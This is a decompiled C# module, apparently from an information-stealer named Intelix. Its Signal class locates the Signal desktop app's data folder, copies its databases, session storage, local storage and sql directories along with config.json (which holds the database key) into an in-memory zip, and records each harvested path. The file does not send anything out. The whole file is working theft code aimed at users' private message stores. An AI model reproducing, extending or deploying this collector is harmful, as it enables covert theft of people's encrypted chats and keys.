using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001E RID: 30
	public class Signal : ITarget
	{
		// Token: 0x0600005B RID: 91 RVA: 0x00004610 File Offset: 0x00002810
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Signal";
				string[] array = new string[]
				{
					"databases",
					"Session Storage",
					"Local Storage",
					"sql"
				};
				foreach (string path in array)
				{
					string text2 = Path.Combine(text, path);
					bool flag2 = Directory.Exists(text2);
					if (flag2)
					{
						string text3 = Path.Combine("Signal", path);
						zip.AddDirectoryFiles(text2, text3, true);
						counterApplications.Files.Add(text2 + " => " + text3);
					}
				}
				string text4 = Path.Combine(text, "config.json");
				bool flag3 = File.Exists(text4);
				if (flag3)
				{
					string text5 = Path.Combine("Signal", "config.json");
					zip.AddFile(text5, File.ReadAllBytes(text4));
					counterApplications.Files.Add(text4 + " => " + text5);
					counterApplications.Files.Add(text5);
				}
				bool flag4 = counterApplications.Files.Count > 0;
				if (flag4)
				{
					counterApplications.Files.Add("Signal\\");
					counter.Messangers.Add(counterApplications);
				}
			}
		}
	}
}
